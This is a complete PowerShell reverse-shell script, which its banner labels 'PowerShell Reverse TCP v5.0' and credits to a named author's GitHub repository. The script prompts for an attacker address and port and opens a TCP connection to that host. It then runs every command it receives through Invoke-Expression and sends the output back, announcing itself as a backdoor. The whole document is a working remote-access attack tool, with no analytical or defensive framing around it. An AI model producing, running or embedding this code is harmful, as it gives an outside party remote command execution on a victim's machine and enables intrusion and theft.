$addr = $(Read-Host -Prompt "Enter address").Trim();
if (-not $addr) {
	Write-Host "Address is required";
	exit 1;
}
$port = $(Read-Host -Prompt "Enter port number").Trim();
if (-not $port) {
	Write-Host "Port number is required";
	exit 1;
}
Write-Host "PowerShell Reverse TCP v5.0 by Ivan Sincek.";
Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.";
$buffer = New-Object Byte[] 1024;
$data = New-Object Text.StringBuilder;
$response = New-Object Text.StringBuilder;
try {
	$client = New-Object Net.Sockets.TcpClient($addr, $port);
	$stream = $client.GetStream();
	$encoding = New-Object Text.UTF8Encoding;
	$writer = New-Object IO.StreamWriter($stream, $encoding, $buffer.Length);
	$writer.AutoFlush = $true;
	Write-Host "Backdoor is up and running...";
	do {
		$writer.Write("PS>");
		[void]$data.Clear();
		do {
			$bytes = $stream.Read($buffer, 0, $buffer.Length);
			if ($bytes -gt 0) {
				[void]$data.Append($encoding.GetString($buffer, 0, $bytes));
			}
		} while ($stream.DataAvailable);
		if ($data.Length -gt 0) {
			[void]$response.Clear();
			try {
				[void]$response.Append($(Invoke-Expression -Command $data.ToString() 2>&1 | Out-String));
			} catch {
				[void]$response.Append($_.Exception.Message);
			}
			$writer.Write($response.ToString());
		}
	} while ($bytes -gt 0);
	Write-Host "Backdoor will now exit...";
} catch {
	Write-Host "ERROR: $($_.Exception.Message)";
} finally {
	if ($writer) {
		$writer.Close();
		$writer.Dispose();
		Clear-Variable "writer";
	}
	if ($stream) {
		$stream.Close();
		$stream.Dispose();
		Clear-Variable "stream";
	}
	if ($client) {
		$client.Close();
		$client.Dispose();
		Clear-Variable "client";
	}
	[void]$buffer.Clear();
	Clear-Variable "buffer";
	[void]$data.Clear();
	Clear-Variable "data";
	[void]$response.Clear();
	Clear-Variable "response";
	[GC]::Collect();
}
Clear-Variable "addr";
Clear-Variable "port";
